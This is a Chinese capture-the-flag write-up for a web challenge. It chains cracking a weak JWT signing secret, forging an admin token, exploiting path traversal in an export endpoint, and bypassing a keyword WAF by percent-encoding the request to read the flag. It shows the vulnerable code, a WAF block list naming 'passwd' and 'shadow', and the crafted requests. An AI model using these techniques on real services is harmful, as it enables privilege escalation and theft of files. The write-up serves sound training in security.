# 一枚签名的重量 — WriteUp

| 项目 | 内容 |
|---|---|
| 分类 | Web / JWT 弱密钥 + 越权 + 任意文件读取（WAF 关键字绕过） |
| 分值 | 661（动态分值） |
| 类型 | DynamicContainer |
| 入口 | `http://103.163.47.230:34414`（赛后已释放） |
| Flag | `HTUCTF{167533c1-fd41-435b-96e3-ec543fa3d868}` |
| 提交记录 | 1 次，submitId 4733，Accepted |
| 复现脚本 | `crack.py`（JWT 密钥爆破）、`forge.py`（伪造 admin token）、`exp3.py`（绕过 WAF 读 flag） |

## 1. 前端指向

`/` 是个 SPA，`/static/js/app.js` 里直接写明了「会话方式 JWT · HS256」、Cookie 名 `htu_token`、
以及几个接口：`/api/me`、`/api/profile`、`/api/reports`、`/api/admin/users`、`/api/admin/export?file=`。
注释里还有一句关键提示：

> 服务端只认 JWT 里的 role；普通用户在这里被 403 拦下

## 2. 注册拿样本 token

注意注册接口要 **JSON**（`Content-Type: application/json`），用表单编码会报「用户名需为 3-20 位字母、数字或下划线」：

```python
POST /api/register  {"username":"hacker0100","password":"Passw0rd!2026"}
```

拿到的 Cookie 是：

```
header  {"alg":"HS256","typ":"JWT"}
payload {"sub":"4","name":"hacker0100","role":"user","iat":...,"exp":...}
```

## 3. 爆破 HS256 密钥

题目描述里「有人把密钥写成了顺口的旧习惯」= 弱口令。用主题词 + 常见后缀生成 6738 个候选：

```
候选 6738
SECRET: HTU@2026
```

## 4. 伪造管理员身份

`sub` 改成管理员 uid（`/api/admin/users` 里 admin 是 1），`role` 改成 `admin`，用 `HTU@2026` 重签：

```python
{"sub":"1","name":"admin","role":"admin","iat":now,"exp":now+604800}
```

带上新 `htu_token` 访问 `/api/admin/users` 直接 200，返回 admin / bob / carol / 自己四个账号。

## 5. 导出接口的任意文件读取

```python
@app.get("/api/admin/export")
@admin_required
def admin_export(payload):
    fname = request.args.get("file", "monthly.csv")
    path = os.path.join(ARCHIVE_DIR, fname)   # 未做路径约束
```

正常导出（monthly/quarterly/annual.csv）只给报表。但 `os.path.join` 遇到**绝对路径会丢掉前缀**，
所以 `file=/app/app.py` 直接读到了后端源码（13KB，整份题目逻辑都在里面）。

## 6. 绕过自研 WAF

源码里 WAF 长这样：

```python
_WAF_BLOCK = ["..", "flag", "etc", "proc", "passwd", "shadow", "root", "%00"]
qs = request.query_string.decode("latin-1").lower()   # 只匹配原始 query string，不解码
```

**只对原始 query string 做明文匹配，不解码** —— 所以把关键字百分号编码就能绕：

| 请求 | 结果 |
|---|---|
| `?file=../flag` | 403 被拦截（含 `..` 和 `flag`） |
| `?file=%2e%2e/%66lag` | 404（目录里没这个文件，但 WAF 已绕过） |
| `?file=/%66lag` | **200 `HTUCTF{167533c1-fd41-435b-96e3-ec543fa3d868}`** |

`%66lag` 解码后是 `flag`，WAF 看到的字符串里没有 `flag` 这个子串，于是放行。

## 7. 一句话总结

JWT 弱密钥 `HTU@2026` → 伪造 `role=admin`（考点①）→ 管理端导出接口路径穿越（考点②）→
WAF 只匹配未解码的 query string，用 `%66lag` 绕过（考点③）。
